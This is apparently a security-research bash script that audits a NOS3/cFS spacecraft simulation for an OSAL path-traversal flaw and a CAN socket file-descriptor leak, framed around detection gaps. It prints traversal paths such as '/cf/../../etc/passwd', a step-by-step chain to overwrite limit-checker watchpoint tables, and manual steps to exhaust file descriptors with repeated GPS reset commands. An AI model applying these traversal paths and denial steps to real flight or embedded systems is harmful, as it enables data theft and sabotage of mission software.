#!/usr/bin/env bash
# investigate_mm_traversal.sh - Phase 2 / Scenario 3A: MM path traversal surface audit
#
# Enumerates the attack surface for OSAL path traversal (F1/CVE-2025-25371):
#   OS_TranslatePath() at osapi-filesys.c:675 never strips "../" sequences,
#   so MM commands (DUMP_MEM_TO_FILE, LOAD_MEM_FROM_FILE, SYM_TBL_TO_FILE)
#   can read/write arbitrary filesystem paths from the cFS sandbox.
#
# Also documents the CAN FD file descriptor leak (F6/Scenario 3B) test steps.
#
# HOW TO USE:
#   Run INSIDE the nos3 build container (must be after make launch):
#     cd nos3
#     make debug          # opens interactive shell in ivvitc/nos3-64 container
#     ./scripts/attack/investigate_mm_traversal.sh
#
# References:
#   phase2_traversal_can_denial.md
#   CVE-2025-25371 - OSAL path traversal in OS_TranslatePath (osapi-filesys.c:675)
#   F6 - libcan.c CAN socket FD leak on failed ioctl (Scenario 3B)

set -euo pipefail

CFS_PROC="core-cpu1"
CF_DIR="/cf"

echo "==================================================================="
echo "  Phase 2 - MM Path Traversal & CAN FD Leak Surface Audit"
echo "==================================================================="
echo ""

# ─── Part 1: MM-reachable shared objects ───────────────────────────────────
echo "--- Part 1: MM-reachable .so symbols in ${CF_DIR} ---"
if [[ -d "$CF_DIR" ]]; then
    for so in "${CF_DIR}"/*.so; do
        echo ""
        echo "[*] ${so}:"
        nm -D "$so" 2>/dev/null | grep " [BD] " | awk '{print "    " $3 " (offset 0x" $1 ")"}' | head -20 || true
    done
else
    echo "[ERROR] ${CF_DIR} not found. Is NOS3 running? (make launch)"
    exit 1
fi

# ─── Part 2: cFS process load map ─────────────────────────────────────────
echo ""
echo "--- Part 2: core-cpu1 /proc/maps (first 40 lines) ---"
CFS_PID=$(pgrep -f "$CFS_PROC" 2>/dev/null | head -1 || true)
if [[ -n "$CFS_PID" ]]; then
    head -40 "/proc/${CFS_PID}/maps"
else
    echo "[WARN] ${CFS_PROC} not running; skipping maps."
fi

# ─── Part 3: Traversal path construction ──────────────────────────────────
echo ""
echo "--- Part 3: Traversal path examples (F1 / CVE-2025-25371) ---"
echo ""
echo "  OS_TranslatePath() maps '/cf/<name>' → OSAL sandbox path."
echo "  No '../' stripping → arbitrary filesystem read/write from cFS."
echo ""
echo "  Attack paths (send via MM_DUMP_MEM_TO_FILE_CC or MM_LOAD_MEM_FROM_FILE_CC):"
echo "    /cf/../tmp/exfil.bin         → writes to /tmp/exfil.bin"
echo "    /cf/../cf/lc_def_wdt.tbl     → overwrites LC WDT table"
echo "    /cf/../proc/version          → reads kernel version (read-only)"
echo "    /cf/../../etc/passwd         → reads /etc/passwd"
echo ""
echo "  Table overwrite chain (from phase2_traversal_can_denial.md):"
echo "    1. MM SYM_TBL_TO_FILE → dump symbol table to /cf/../tmp/sym.bin"
echo "    2. Craft lc_def_wdt.tbl blob with adversary watchpoint thresholds"
echo "    3. MM LOAD_MEM_FROM_FILE → poke crafted blob into RAM"
echo "    4. Send CFE_TBL_LOAD_CC to LC → LC loads adversary WDT"
echo "    5. Result: LC watchpoints misconfigured → self-sustaining safe-mode oscillation"
echo ""

# ─── Part 4: Safe traversal read test ─────────────────────────────────────
echo "--- Part 4: Safe traversal read test (non-destructive) ---"
echo ""
echo "  To confirm traversal is live, send from COSMOS or Python:"
echo "    MM_DUMP_MEM_TO_FILE_CC:"
echo "      MemType   = MEM_RAM"
echo "      NumBytes  = 64"
echo "      SrcSymbol = 'CFE_ES_Global'   (known symbol)"
echo "      SrcOffset = 0"
echo "      FileName  = '/cf/../tmp/traverse_test.bin'"
echo ""
echo "  Then inside the container:"
echo "    ls -la /tmp/traverse_test.bin && xxd /tmp/traverse_test.bin | head"
echo ""
echo "  If the file appears at /tmp/ (not /cf/tmp/), traversal is confirmed."
echo "  Expected: Logstash does NOT report this (only watches omni_logs/ and attack_logs/)."
echo "  This is Observability Gap #1 from the Phase 2 research."
echo ""

# ─── Part 5: CAN FD leak (Scenario 3B) ────────────────────────────────────
echo "--- Part 5: CAN FD Leak audit (Scenario 3B / F6) ---"
echo ""
if [[ -n "$CFS_PID" ]]; then
    FD_COUNT=$(ls /proc/${CFS_PID}/fd 2>/dev/null | wc -l || echo "N/A")
    echo "[*] Current open FD count for cFS (PID ${CFS_PID}): ${FD_COUNT}"
    echo ""
    echo "  FD leak mechanics (libcan.c):"
    echo "    socket() succeeds → FD allocated"
    echo "    ioctl(SIOCGIFINDEX) fails (interface down) → error path returns without close()"
    echo "    Each GPS RESET_CC with CAN interface down leaks 1 FD"
    echo "    After ~(RLIMIT_NOFILE - current_fds) resets → EMFILE → GPS app unrecoverable"
    echo ""
    FD_LIMIT=$(cat /proc/${CFS_PID}/limits 2>/dev/null | awk '/open files/{print $4}' || echo "N/A")
    echo "[*] cFS open files limit: ${FD_LIMIT}"
    LEAKS_TO_EMFILE=$(( ${FD_LIMIT:-1024} - ${FD_COUNT:-0} ))
    echo "[*] Estimated RESET_CC commands to EMFILE: ~${LEAKS_TO_EMFILE}"
    echo ""
    echo "  Test steps (manual - requires GPS RESET_CC command access):"
    echo "    1. Bring down CAN interface: ip link set can0 down (inside container)"
    echo "    2. Send 100x GPS RESET_CC via COSMOS"
    echo "    3. Check: ls /proc/${CFS_PID}/fd | wc -l  (expect +100 vs baseline)"
    echo "    4. Continue until EMFILE; observe GPS DeviceEnabled=0 in Kibana"
    echo "    5. Confirm LC WP#3 trips → AP#3 fires RTS#13 (cascade observable)"
else
    echo "[WARN] cFS not running; skipping FD count."
fi

echo ""
echo "==================================================================="
echo "  Audit complete. See phase2_traversal_can_denial.md for KQL queries"
echo "  Q7-Q11: MM traversal, recon→dump, GPS DeviceEnabled drop, RESET bursts"
echo "==================================================================="
